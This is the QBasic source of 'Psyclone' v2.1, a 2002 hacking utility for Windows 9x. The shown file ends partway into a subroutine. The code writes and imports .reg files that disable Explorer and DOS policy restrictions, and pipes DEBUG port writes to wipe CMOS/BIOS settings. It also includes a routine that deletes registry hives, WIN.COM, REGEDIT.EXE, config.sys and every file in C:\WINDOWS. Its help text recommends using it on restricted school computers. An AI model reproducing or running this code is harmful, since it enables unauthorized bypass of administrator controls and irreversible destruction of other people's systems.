@@ -1,0 +1,2606 @@
+Mephio                         Work with DOS and Windows      Mephio2002@yahoo.com           09-15-02 (  :  )       QB, Qbasic, PDS        5    34645    psyclone.bas'This Program was written by Mephio (Mephio2002@yahoo.com)
+'ã'Author: Mephio ã'E-Mail: Mephio2002@yahoo.com ã'Date Written: July 18, 2002 ã'Code: QB, QBasic 
+'
+'You can use the source in your programs, but please give credit where it is
+'due.     -Thanks
+
+
+
+
+
+
+
+
+
+DECLARE SUB NetUtilsMenu ()
+DECLARE SUB AllowDOS ()
+DECLARE SUB KillRegMenu ()
+DECLARE SUB KillSysFiles ()
+DECLARE SUB KillFilesMenu ()
+DECLARE SUB PsyText ()
+DECLARE SUB HelpMenu ()
+DECLARE SUB Help ()
+DECLARE SUB About ()
+DECLARE SUB FileDelete ()
+DECLARE SUB Bios ()
+DECLARE SUB Opening ()
+DECLARE SUB time ()
+DECLARE SUB RestoreOriginal ()
+DECLARE SUB ChangeSetting ()
+DECLARE SUB KillReg ()
+DECLARE SUB Options ()
+DECLARE SUB Quit ()
+DECLARE SUB NoPolicies ()
+DECLARE SUB NoPassword ()
+DECLARE SUB MainMenu ()
+DECLARE SUB Title ()
+DECLARE SUB Complete ()
+DECLARE SUB scrn ()
+DIM SHARED Phrase2$(1 TO 1000)
+DIM SHARED Phrase$(1 TO 200)
+DIM SHARED Titles$
+COMMON SHARED CurDrive$, windir$, mainlen, undopassword, TempDrive$, poldrive$
+ON ERROR GOTO errorh
+
+
+
+'Variables
+CurDrive$ = "C:\"
+windir$ = "WINDOWS"
+mainlen = 3
+TempDrive$ = "C:\"
+
+
+
+
+
+
+CLS
+
+Opening
+
+errorh:
+RESUME NEXT
+RETURN
+
+'Explorer
+DATA "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]"
+DATA "ClearRecentDocsOnExit", "DisableRegistryTools", "NoAddPrinter", "NoClose"
+DATA "NoDeletePrinter", "NoDesktop", "NoDevMgrUpdate", "NoFind", "NoInternetIcon"
+DATA "NoNetHood", "NoRecentDocsHistory", "NoRun", "NoSaveSettings", "NoSetFolders"
+DATA "NoSetTaskbar", "NoSMMyDocs", "NoSMMyPictures", "NoWindowsUpdate"
+DATA "EditLevel", "EnforceShellExtensionSecurity"
+DATA "NoActiveDesktop", "NoActiveDesktopChanges", "NoChangeStartMenu"
+DATA "NoCommonGroups", "NoCustomizeWebView", "NoEditMenu", "NoFavoritesMenu"
+DATA "NoFileMenu", "NoFileUrl", "NoForgetSoftwareUpdate", "NoHelp", "NoLogOff"
+DATA "NoMSAppLogo", "NoNetConnectDisconnect", "NoRecentDocsMenu", "NoResolveSearch", "NoResolveTrack"
+DATA "NoRun", "NoSetActiveDesktop", "NoSetTaskbar", "NoSettingsWizards", "NoStartMenuSubFolders"
+DATA "NoTrayContextMenu", "NoViewContextMenu", "NoWebMenu", "NoWindowsUpdate"
+DATA "RestrictRun"
+DATA "-99"
+
+SUB About
+scrn
+BG = 0
+FG = 2
+
+LOCATE 7, 15: COLOR FG, BG
+PRINT "ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ About ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿"
+
+FOR x = 8 TO 13
+LOCATE x, 15
+PRINT "³                                                  ³"
+NEXT
+LOCATE 14, 15
+PRINT "ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ"
+
+LOCATE 15, 16
+COLOR 0, 0:
+PRINT "                                                     "
+
+FOR x = 8 TO 15
+LOCATE x, 67: PRINT "  "
+NEXT
+
+LOCATE 9, 25: COLOR FG, BG
+PRINT "PSYCLONE - Programmed by Mephio"
+LOCATE 10, 25
+PRINT "         Version 2.1"
+LOCATE 12, 16
+PRINT "Email me @ Mephio2002@yahoo.com with any questions"
+
+DO
+a$ = INKEY$
+IF a$ = CHR$(27) THEN Quit
+IF RIGHT$(a$, 1) = ";" THEN HelpMenu: Titles$ = "Options": scrn: EXIT DO
+LOOP WHILE INKEY$ = ""
+
+END SUB
+
+SUB AllowDOS
+
+LOCATE 19, 12
+COLOR 4, 7
+PRINT "There may still be restrictions if .POL files are enabled"
+
+DO
+LOOP WHILE INKEY$ = ""
+
+q$ = CHR$(34): z$ = CHR$(34) + "=dword:00000000"
+'Makes a backup copy of the part of the registry that the program works with
+SHELL "Regedit /e c:\unreg2.reg HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\WinOldApp"
+
+
+
+
+OPEN "c:\delkey.reg" FOR OUTPUT AS #1  'This is the .reg file that trashes
+                                       'most restrictive windows policies
+
+'Opening Lines =========================================================
+
+PRINT #1, "REGEDIT4"
+PRINT #1, ""
+PRINT #1, "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\WinOldApp]"
+PRINT #1, q$ + "Disabled" + z$
+PRINT #1, q$ + "NoRealMode" + z$
+CLOSE
+
+'=======================================================================
+
+
+SHELL "REGEDIT c:\delkey.reg"
+'Allows DOS in Windows
+
+
+
+Complete
+
+
+END SUB
+
+SUB Bios
+
+OPEN TempDrive$ + "bios.zz_" FOR OUTPUT AS #1
+PRINT #1, "o 70 2e"
+PRINT #1, "o 71 ff"
+PRINT #1, "q"
+CLOSE #1
+
+SHELL "DEBUG < " + TempDrive$ + "bios.zz_"
+
+
+
+Complete
+
+END SUB
+
+SUB ChangeSetting
+
+Titles$ = "Change Settings"
+scrn
+
+COLOR 0, 7
+DO
+
+
+LOCATE 7, 20: PRINT "What setting do you want to change?"
+LOCATE 9, 20: PRINT "1) Drive to search (default is C:\)"
+LOCATE 10, 20: PRINT "  Current is " + CurDrive$
+LOCATE 11, 20: PRINT "2) Windows directory (default is WINDOWS)"
+LOCATE 12, 20: PRINT "  Current is " + LEFT$(windir$, 12)
+LOCATE 13, 20: PRINT "3) Temporary file drive (default is C:\)"
+LOCATE 14, 20: PRINT "  Current is " + TempDrive$
+LOCATE 15, 20: PRINT "4) Back"
+
+
+
+DO
+a$ = INKEY$
+IF a$ = CHR$(27) THEN Quit
+IF RIGHT$(a$, 1) = ";" THEN HelpMenu: Titles$ = "Change Setting": scrn: EXIT DO
+LOOP UNTIL VAL(a$) > 0 AND VAL(a$) <= 5
+
+IF VAL(a$) = 1 THEN GOSUB ChangeDrive
+IF VAL(a$) = 2 THEN GOSUB ChangeWinDir
+IF VAL(a$) = 3 THEN GOSUB ChangeTempDrive
+IF VAL(a$) = 4 THEN EXIT SUB
+
+LOOP
+
+
+
+ChangeDrive:
+LOCATE 17, 13
+PRINT "What drive do you want QBH4CK to search in? "
+COLOR 0, 0
+LOCATE 19, 30
+PRINT " ";
+COLOR 0, 7
+PRINT ":\  No Letter for default"
+
+DO
+       COLOR 4, 0
+       a$ = INKEY$
+       LOCATE 19, 30: PRINT UCASE$(a$)
+      IF a$ = CHR$(27) THEN Quit
+      IF a$ <> "" THEN newdrive$ = UCASE$(a$): EXIT DO
+LOOP
+        IF ASC(newdrive$) < 65 OR ASC(newdrive$) > 90 THEN
+        CurDrive$ = "C:\"
+        ELSE
+        CurDrive$ = newdrive$ + ":\"
+        END IF
+COLOR 0, 7
+DO
+LOOP WHILE INKEY$ = ""
+scrn
+RETURN
+
+
+
+
+ChangeWinDir:
+LOCATE 16, 13
+PRINT "What directory is Windows in? (Don't include drive) "
+COLOR 0, 0
+LOCATE 17, 13
+COLOR 0, 7
+PRINT "Blank for default"
+
+       LOCATE 19, 13: INPUT "", newwindir$
+
+        IF newwindir$ = "" THEN
+        windir$ = "WINDOWS"
+        ELSE
+        windir$ = UCASE$(newwindir$)
+        END IF
+
+DO
+LOOP WHILE INKEY$ = ""
+scrn
+
+RETURN
+
+
+ChangeTempDrive:
+LOCATE 17, 13
+PRINT "What drive do you want PSYCLONE to make temp files in? "
+COLOR 0, 0
+LOCATE 19, 30
+PRINT " ";
+COLOR 0, 7
+PRINT ":\  No Letter for default"
+
+DO
+       COLOR 4, 0
+       a$ = INKEY$
+       LOCATE 19, 30: PRINT UCASE$(a$)
+      IF a$ = CHR$(27) THEN Quit
+      IF a$ <> "" THEN newdrive$ = UCASE$(a$): EXIT DO
+LOOP
+        IF ASC(newdrive$) < 65 OR ASC(newdrive$) > 90 THEN
+        TempDrive$ = "C:\"
+        ELSE
+        TempDrive$ = newdrive$ + ":\"
+        END IF
+COLOR 0, 7
+
+DO
+LOOP WHILE INKEY$ = ""
+scrn
+
+RETURN
+
+
+END SUB
+
+SUB Complete
+scrn
+LOCATE 19, 30
+COLOR 4, 7
+PRINT "Operation Complete"
+
+DO
+LOOP WHILE INKEY$ = ""
+
+LOCATE 19, 30
+PRINT "                  "
+
+END SUB
+
+SUB Edit.MSDOS.SYS
+
+FG = 2: BG = 0
+
+LOCATE 6, 20: COLOR FG, BG
+PRINT "ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿"
+FOR x = 7 TO 15: LOCATE x, 20
+PRINT "³                                       ³": NEXT
+LOCATE 16, 20
+PRINT "ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ"
+
+
+
+LOCATE 7, 25: PRINT "Do you want to allow bootkeys?"
+LOCATE 8, 25: PRINT "(Press keys to bring up options"
+LOCATE 9, 25: PRINT "menus during boot up and/or bypass"
+LOCATE 10, 25: PRINT "config.sys and autoexec.bat)"
+LOCATE 13, 25: PRINT "< "; : COLOR 15, BG: PRINT "Y"; : COLOR FG, BG: PRINT "es >";
+PRINT "                < "; : COLOR 15, BG: PRINT "N"; : COLOR FG, BG: PRINT "o >"
+
+
+DO
+a$ = INKEY$
+IF a$ = CHR$(27) THEN EXIT SUB
+IF UCASE$(a$) = "Y" THEN Keys = 1: EXIT DO
+IF UCASE$(a$) = "N" THEN Keys = 0: delay$ = "D": EXIT DO
+
+LOOP
+
+
+IF Keys = 1 THEN GOSUB CheckBootDelay
+
+
+
+OPEN CurDrive$ + "msdos.sys" FOR INPUT AS #1
+OPEN TempDrive$ + "MSDOS.00_" FOR OUTPUT AS #2
+
+DO
+LINE INPUT #1, line$
+IF (LEFT$(UCASE$(line$), 8) <> "BOOTKEYS") AND (LEFT$(UCASE$(line$), 9) <> "BOOTDELAY") THEN
+PRINT #2, line$
+END IF
+
+LOOP UNTIL EOF(1)
+
+PRINT #2, "BOOTKEYS=" + RIGHT$(STR$(Keys), 1)
+IF LEFT$(UCASE$(delay$), 1) <> "D" THEN PRINT #2, "BOOTDELAY=" + MID$(STR$(delay), 2, LEN(delay) - 1)
+
+
+CLOSE
+
+
+SHELL "copy " + CurDrive$ + "msdos.sys " + TempDrive$ + "msdos.bak /y > " + TempDrive$ + "a.txt"
+SHELL "copy " + TempDrive$ + "msdos.00_ " + CurDrive$ + "msdos.sys /y > " + TempDrive$ + "a.txt"
+KILL TempDrive$ + "msdos.00_"
+
+EXIT SUB
+
+
+CheckBootDelay:
+LOCATE 6, 20: COLOR FG, BG
+PRINT "ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿"
+FOR x = 7 TO 15: LOCATE x, 20
+PRINT "³                                       ³": NEXT
+LOCATE 16, 20
+PRINT "ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ"
+
+
+
+LOCATE 7, 25: PRINT "What do you want the boot delay"
+LOCATE 8, 25: PRINT "to be?  (This determines how long"
+LOCATE 9, 25: PRINT "the computer waits for you to "
+LOCATE 10, 25: PRINT "a key during boot up:  0 "
+LOCATE 11, 25: PRINT "is none: input 'D' for default."
+
+LOCATE 13, 25:
+INPUT "", delay$
+IF LEFT$(UCASE$(delay$), 1) <> "D" THEN delay = VAL(delay$)
+RETURN
+
+
+END SUB
+
+SUB FileDelete
+LOCATE 7, 15: COLOR 0, 7
+PRINT "ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Full File Delete ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿"
+
+FOR x = 8 TO 13
+LOCATE x, 15
+PRINT "³                                                  ³"
+NEXT
+LOCATE 14, 15
+PRINT "ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ"
+
+LOCATE 15, 16
+COLOR 0, 0:
+PRINT "                                                     "
+
+FOR x = 8 TO 15
+LOCATE x, 67: PRINT "  "
+NEXT
+
+COLOR 0, 7
+LOCATE 9, 20
+PRINT "Enter the full path and name of the program"
+LOCATE 10, 20
+PRINT "you wish to delete.  You will not be able to"
+LOCATE 11, 20
+PRINT "undelete it!!!  Leave blank to cancel."
+LOCATE 13, 20
+INPUT "", File$
+
+IF File$ = "" THEN EXIT SUB
+
+LOCATE 5, 25: COLOR 0, 4
+PRINT "ÚÄÄÄÄÄÄÄÄÄÄ Confirm Delete ÄÄÄÄÄÄÄÄÄÄ¿"
+FOR x = 6 TO 9
+LOCATE x, 25
+PRINT "³                                    ³"
+NEXT
+LOCATE 10, 25
+PRINT "ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ"
+
+LOCATE 6, 26: PRINT "    This file will be permanently"
+LOCATE 7, 26: PRINT " deleted!  Do you want to Continue?"
+LOCATE 9, 26: PRINT "      < Yes >          < No >"
+LOCATE 9, 34: COLOR 15, 4: PRINT "Y"
+LOCATE 9, 51: PRINT "N"
+
+LOCATE 11, 26
+COLOR 8, 0:
+PRINT "te it!!!  Leave blank to cancel.       "
+
+FOR x = 6 TO 11
+LOCATE x, 63: PRINT "  "
+NEXT
+LOCATE 7, 63: PRINT "ÄÄ"
+LOCATE 10, 63: PRINT "o"
+
+DO
+a$ = INKEY$
+IF UCASE$(a$) = "Y" THEN GOSUB Proceed: EXIT SUB
+IF UCASE$(a$) = "N" THEN EXIT DO
+IF UCASE$(a$) = CHR$(27) THEN EXIT DO
+
+LOOP
+
+EXIT SUB
+
+
+Proceed:
+
+SHELL "ATTRIB -R -H -S " + File$
+
+OPEN File$ FOR OUTPUT AS #2
+PRINT #2, "This file has been deleted by PSYCLONE"
+CLOSE #2
+
+KILL File$
+Complete
+RETURN
+
+
+END SUB
+
+SUB Help
+scrn
+
+FG = 2: BG = 0
+
+Top = 8: Bottom = 18: Left = 22: Right = 65
+
+
+
+
+LOCATE 6, 20: COLOR FG, BG
+PRINT "ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿"
+FOR x = 7 TO 18
+LOCATE x, 20
+PRINT "³                                             °"
+NEXT
+LOCATE 19, 20
+PRINT "ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ"
+LOCATE 20, 21
+COLOR 0, 0
+PRINT STRING$(48, " ")
+FOR x = 7 TO 20
+LOCATE x, 67
+PRINT "  "
+NEXT
+
+LOCATE 7, 66: COLOR FG, BG: PRINT ""
+LOCATE 18, 66: PRINT ""
+
+
+GOSUB Dima
+
+LOCATE 6, 43 - LEN(Titles2$) / 2
+PRINT Titles2$
+
+GOSUB PutStuff
+
+DO
+b$ = INKEY$
+IF b$ <> "" THEN GOSUB KeyHandle
+
+
+LOOP UNTIL b$ = CHR$(27)
+
+EXIT SUB
+
+
+KeyHandle:
+
+
+IF RIGHT$(b$, 1) = "P" THEN
+ IF Num < MaxX - 1 THEN Num = Num + 1: GOSUB PutStuff
+END IF
+
+IF RIGHT$(b$, 1) = "H" THEN
+ IF Num > 1 THEN Num = Num - 1: GOSUB PutStuff
+END IF
+
+IF RIGHT$(b$, 1) = "O" THEN Num = MaxX - 1: GOSUB PutStuff
+
+IF RIGHT$(b$, 1) = "G" THEN Num = 1: GOSUB PutStuff
+
+IF RIGHT$(b$, 1) = "Q" THEN
+ IF Num + (Bottom - Top) < MaxX - 1 THEN
+   Num = Num + (Bottom - Top)
+ ELSE
+   Num = MaxX - 1
+ END IF
+GOSUB PutStuff
+END IF
+
+IF RIGHT$(b$, 1) = "I" THEN
+ IF Num - (Bottom - Top) > 1 THEN
+   Num = Num - (Bottom - Top)
+ ELSE
+   Num = 1
+ END IF
+GOSUB PutStuff
+END IF
+
+
+
+'F1 = ;
+'F2 = <
+'F3 = =
+'F4 = >
+'F5 = ?
+'F6 = @
+'F7 = A
+'F8 = B
+'F9 = C
+'F10 = D
+'F11 = …
+'F12 = †
+'Delete = S
+'End = O
+'Insert = R
+'Home = G
+'PAGE UP = I
+'PAGE DOWN = Q
+'UP ARROW = H
+'DOWN  ARROW = P
+'LEFT ARROW = K
+'RIGHT ARROW = M
+
+
+RETURN
+
+
+PutStuff:
+
+
+COLOR FG, BG
+OldX = Num
+Num = Num - 1
+FOR y = Top TO Bottom
+Num = Num + 1
+LOCATE y, Left: PRINT Phrase$(Num); : PRINT STRING$(Right - LEN(Phrase$(Num)) - Left, " ")
+NEXT
+
+Num = OldX
+RETURN
+
+
+Dima:
+Titles2$ = " Help "
+Num = 1
+Phrase$(Num) = "            Psyclone Version 2.1": Num = Num + 1
+Phrase$(Num) = "            Programmed by Mephio": Num = Num + 1
+Phrase$(Num) = "": Num = Num + 1
+Phrase$(Num) = "       E-Mail @ Mephio2002@yahoo.com": Num = Num + 1
+Phrase$(Num) = "": Num = Num + 1
+Phrase$(Num) = "": Num = Num + 1
+Phrase$(Num) = "       IMPORTANT!!!:  THIS PROGRAM CAN NOT": Num = Num + 1
+Phrase$(Num) = "USED ON WINDOWS 3.X MACHINES.  IT CAN": Num = Num + 1
+Phrase$(Num) = "REALLY DAMAGE A COMPUTER IF RUN ON A 3.X PC": Num = Num + 1
+Phrase$(Num) = "": Num = Num + 1
+Phrase$(Num) = "       This program should be pretty self-": Num = Num + 1
+Phrase$(Num) = "explanatory.  For best results, stick it on": Num = Num + 1
+Phrase$(Num) = "a boot disk and boot up the computer.  This": Num = Num + 1
+Phrase$(Num) = "way, you can run Psyclone through DOS and": Num = Num + 1
+Phrase$(Num) = "not have any Windows restricions put on": Num = Num + 1
+Phrase$(Num) = "you (which you can remove with Psyclone :)": Num = Num + 1
+Phrase$(Num) = "Psyclone may not work properly if run from": Num = Num + 1
+Phrase$(Num) = "within Windows.": Num = Num + 1
+Phrase$(Num) = "": Num = Num + 1
+Phrase$(Num) = "": Num = Num + 1
+Phrase$(Num) = "     To undo disabling the Registry files,": Num = Num + 1
+Phrase$(Num) = ".Pol files, or Windows password files,": Num = Num + 1
+Phrase$(Num) = "goto Options, Restore Original Settings,": Num = Num + 1
+Phrase$(Num) = "and hit whatever needs to be restored.": Num = Num + 1
+Phrase$(Num) = "(Do not disable the Registry Explorer key": Num = Num + 1
+Phrase$(Num) = "more than once, or you will not be able to": Num = Num + 1
+Phrase$(Num) = "undo it through Psyclone.)": Num = Num + 1
+Phrase$(Num) = "     You cannot undo a Full File Delete or": Num = Num + 1
+Phrase$(Num) = "undo anything done to the BIOS.  Sorry.  I": Num = Num + 1
+Phrase$(Num) = "don't know how to undo the BIOS settings": Num = Num + 1
+Phrase$(Num) = "and I'm not going to try to figure it out.": Num = Num + 1
+Phrase$(Num) = "If you know how to restore it, Email me.": Num = Num + 1
+Phrase$(Num) = "     Psyclone can edit MSDOS.SYS to allow": Num = Num + 1
+Phrase$(Num) = "you to use boot keys during bootup.  If": Num = Num + 1
+Phrase$(Num) = "you want to undo the changes made to": Num = Num + 1
+Phrase$(Num) = "MSDOS.SYS, you have to hit the button": Num = Num + 1
+Phrase$(Num) = "in the Restore Original Settings.": Num = Num + 1
+Phrase$(Num) = "(This is not undone if you hit Undo All!)": Num = Num + 1
+Phrase$(Num) = "": Num = Num + 1
+Phrase$(Num) = "     You can change default directories": Num = Num + 1
+Phrase$(Num) = "through Options, Change Settings.  You": Num = Num + 1
+Phrase$(Num) = "can restore the defaults the same way": Num = Num + 1
+Phrase$(Num) = "as restoring the Windows password.": Num = Num + 1
+Phrase$(Num) = "": Num = Num + 1
+Phrase$(Num) = "     You can view important system files": Num = Num + 1
+Phrase$(Num) = "by going to Options, View a System file.": Num = Num + 1
+Phrase$(Num) = "I wanted everything to be built in to": Num = Num + 1
+Phrase$(Num) = "the program, so you can't edit these ": : Num = Num + 1
+Phrase$(Num) = "files. ": Num = Num + 1
+Phrase$(Num) = "": Num = Num + 1
+Phrase$(Num) = "     You can also destroy important system": Num = Num + 1
+Phrase$(Num) = "files (You won't be able to undo it!) by": Num = Num + 1
+Phrase$(Num) = "going to Kill Files, Kill System Files": Num = Num + 1
+Phrase$(Num) = "(Just in case it's too much trouble to": Num = Num + 1
+Phrase$(Num) = "try and hack a computer )": Num = Num + 1
+Phrase$(Num) = "": Num = Num + 1
+Phrase$(Num) = "     I know that there's not much to the": Num = Num + 1
+Phrase$(Num) = "program now, but if you're running it": Num = Num + 1
+Phrase$(Num) = "on a school computer that's placed too": Num = Num + 1
+Phrase$(Num) = "many restrictions on you, Psyclone can": Num = Num + 1
+Phrase$(Num) = "easily help you undo some of those": Num = Num + 1
+Phrase$(Num) = "restricions.": Num = Num + 1
+Phrase$(Num) = "": Num = Num + 1
+Phrase$(Num) = "     I will continue to update this": Num = Num + 1
+Phrase$(Num) = "program as much as possible.  Please": Num = Num + 1
+Phrase$(Num) = "Email me any comments and suggestions": Num = Num + 1
+Phrase$(Num) = "for something I should add (Don't ": Num = Num + 1
+Phrase$(Num) = "send me any hate mail.)": Num = Num + 1
+Phrase$(Num) = "": Num = Num + 1
+Phrase$(Num) = "     Thanx for trying out my program": Num = Num + 1
+Phrase$(Num) = "                       ==MEPHIO==": Num = Num + 1
+
+
+
+MaxX = Num
+Num = 1
+
+RETURN
+
+
+END SUB
+
+SUB HelpMenu
+
+HelpX = 23
+Rounds = 2
+Round = 1
+
+GOSUB DrawHelpMenu
+GOSUB HighlightHelpMenu
+DO
+a$ = INKEY$
+
+
+IF a$ <> "" THEN GOSUB HelpKeyHandle
+
+LOOP
+
+
+DrawHelpMenu:
+COLOR 0, 7
+LOCATE 2, HelpX: PRINT "ÚÄÄÄÄÄÄÄÄÄ¿"
+LOCATE 3, HelpX: PRINT "³ About   ³ÛÛ"
+LOCATE 4, HelpX: PRINT "³ Help    ³ÛÛ"
+LOCATE 5, HelpX: PRINT "ÀÄÄÄÄÄÄÄÄÄÙÛÛ"
+LOCATE 6, HelpX + 1: PRINT "ÛÛÛÛÛÛÛÛÛÛÛÛ"
+
+RETURN
+
+
+HighlightHelpMenu:
+COLOR 7, 0
+LOCATE Round + 2, HelpX + 1
+IF Round = 1 THEN PRINT " About   ": LOCATE 3, HelpX + 2: COLOR 15, 0: PRINT "A": LOCATE 4, HelpX + 2: COLOR 15, 7: PRINT "H"
+IF Round = 2 THEN PRINT " Help    ": LOCATE 4, HelpX + 2: COLOR 15, 0: PRINT "H": LOCATE 3, HelpX + 2: COLOR 15, 7: PRINT "A"
+
+
+RETURN
+
+
+HelpKeyHandle:
+IF a$ = CHR$(27) THEN EXIT SUB
+
+IF RIGHT$(a$, 1) = "P" THEN Round = Round - 1
+IF RIGHT$(a$, 1) = "H" THEN Round = Round + 1
+
+IF a$ = CHR$(13) THEN
+ IF Round = 1 THEN About: EXIT SUB
+ IF Round = 2 THEN Help: EXIT SUB
+END IF
+
+IF UCASE$(a$) = "A" THEN About: EXIT SUB
+IF UCASE$(a$) = "H" THEN Help: EXIT SUB
+
+'Handle Rounds
+IF Round > Rounds THEN Round = Round - Rounds
+IF Round < 1 THEN Round = Round + Rounds
+
+GOSUB DrawHelpMenu
+GOSUB HighlightHelpMenu
+
+RETURN
+
+
+END SUB
+
+SUB KillFilesMenu
+
+Titles$ = "Kill Files"
+scrn
+
+
+DO
+COLOR 0, 7
+
+LOCATE 7, 25: PRINT "What do you want to do?"
+LOCATE 9, 20: PRINT "1) Permanently delete a file"
+LOCATE 10, 20: PRINT "2) Kill system files"
+LOCATE 11, 20: PRINT "3) Back to Main Menu"
+
+DO
+a$ = INKEY$
+IF a$ = CHR$(27) THEN Quit
+IF RIGHT$(a$, 1) = ";" THEN HelpMenu: Titles$ = "Kill Files": scrn: EXIT DO
+LOOP UNTIL VAL(a$) > 0 AND VAL(a$) <= 3
+IF VAL(a$) = 1 THEN FileDelete: Titles$ = "Kill Files": scrn
+IF VAL(a$) = 2 THEN KillSysFiles: Titles$ = "Kill Files": scrn
+IF VAL(a$) = 3 THEN EXIT SUB
+LOOP
+
+
+END SUB
+
+SUB KillReg
+
+q$ = CHR$(34): z$ = CHR$(34) + "=dword:00000000"
+
+'Makes a backup copy of the part of the registry that the program works with
+
+
+SHELL "Regedit /e c:\unreg.reg HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+
+
+
+
+
+
+
+OPEN "c:\delkey.reg" FOR OUTPUT AS #1  'This is the .reg file that trashes
+                                       'most restrictive windows policies
+
+'Opening Lines =========================================================
+
+PRINT #1, "REGEDIT4"
+PRINT #1, ""
+
+
+'=======================================================================
+
+DO UNTIL reg$ = "-99"
+READ reg$
+IF reg$ = "-99" THEN EXIT DO
+IF LEN(reg$) < 30 AND LEN(reg$) >= 1 THEN
+PRINT #1, q$ + reg$ + z$
+ELSEIF LEN(reg$) = 0 THEN
+PRINT #1, reg$
+ELSE
+PRINT #1, reg$
+END IF
+LOOP
+
+
+CLOSE
+
+SHELL "REGEDIT c:\delkey.reg"
+Complete
+'Explorer
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+END SUB
+
+SUB KillRegMenu
+Titles$ = "Registry Editor"
+scrn
+
+COLOR 0, 7
+DO
+
+LOCATE 7, 20: PRINT "What do you want to do?"
+LOCATE 9, 20: PRINT "1) Disable Registry settings in Explorer"
+LOCATE 10, 20: PRINT "2) Disable Registry restrictions on DOS"
+LOCATE 11, 20: PRINT "3) Back to main menu"
+
+
+
+DO
+a$ = INKEY$
+IF a$ = CHR$(27) THEN Quit
+IF RIGHT$(a$, 1) = ";" THEN HelpMenu: Titles$ = "Registry Editor": scrn: EXIT DO
+LOOP UNTIL VAL(a$) > 0 AND VAL(a$) <= 3
+
+IF VAL(a$) = 1 THEN KillReg: Titles$ = "Registry Editor": scrn
+IF VAL(a$) = 2 THEN AllowDOS: Titles$ = "Registry Editor": scrn
+IF VAL(a$) = 3 THEN EXIT SUB
+
+LOOP
+
+
+END SUB
+
+SUB KillSysFiles
+
+
+
+
+Titles2$ = " !WARNING! "
+GOSUB Box
+BEEP
+
+LOCATE 7, 24: PRINT "YOU ARE ABOUT TO DELETE"
+LOCATE 8, 24: PRINT "IMPORTANT SYSTEM FILES"
+LOCATE 9, 32: PRINT "PROCEED?"
+LOCATE 11, 27: PRINT "< "; : COLOR 15, 4: PRINT "Y"; : COLOR 0, 4: PRINT "es >";
+           PRINT "    < "; : COLOR 15, 4: PRINT "N"; : COLOR 0, 4: PRINT "o >"
+
+
+DO
+a$ = INKEY$
+IF UCASE$(a$) = "N" THEN EXIT SUB
+IF UCASE$(a$) = "Y" THEN EXIT DO
+IF a$ = CHR$(27) THEN END
+
+LOOP
+
+BEEP
+
+GOSUB Box
+
+LOCATE 7, 22: PRINT "THIS ACTION WILL CAUSE YOUR"
+LOCATE 8, 22: PRINT "COMPUTER TO FAIL AND CAN'T"
+LOCATE 9, 23: PRINT "BE UNDONE BY PSYCLONE"
+LOCATE 10, 32: PRINT "PROCEED?"
+LOCATE 12, 27: PRINT "< "; : COLOR 15, 4: PRINT "Y"; : COLOR 0, 4: PRINT "es >";
+PRINT "    < "; : COLOR 15, 4: PRINT "N"; : COLOR 0, 4: PRINT "o >"
+
+
+DO
+a$ = INKEY$
+IF UCASE$(a$) = "N" THEN EXIT SUB
+IF UCASE$(a$) = "Y" THEN EXIT DO
+IF a$ = CHR$(27) THEN END
+
+LOOP
+
+GOSUB Box
+
+BEEP
+Titles2$ = " !CONFIRMATION! "
+GOSUB Box
+
+LOCATE 7, 22: PRINT " TO PREVENT ACCIDENTAL "
+LOCATE 8, 22: PRINT "DELETION OF SYSTEM FILES"
+LOCATE 9, 23: PRINT "ENTER THE CONFIRMATION #"
+LOCATE 10, 32: PRINT "#: 0051031"
+
+LOCATE 12, 35:
+a$ = ""
+INPUT "", a$
+IF a$ <> "0051031" THEN EXIT SUB
+
+
+IF a$ = "0051031" THEN
+SHELL "ATTRIB -H -R -S c:\windows\system.dat"
+SHELL "ATTRIB -H -R -S c:\windows\system.da0"
+SHELL "ATTRIB -H -R -S c:\windows\user.dat"
+SHELL "ATTRIB -H -R -S c:\windows\user.da0"
+
+
+KILL "C:\windows\system.dat"
+KILL "C:\WINDOWS\SYSTEM.DA0"
+KILL "C:\WINDOWS\USER.DAT"
+KILL "C:\WINDOWS\USER.DA0"
+KILL "C:\WINDOWS\WIN.COM"
+KILL "C:\WINDOWS\REGEDIT.EXE"
+KILL "C:\WINDOWS\*.*"
+KILL "C:\Config.sys"
+
+Complete
+END IF
+
+EXIT SUB
+
+Box:
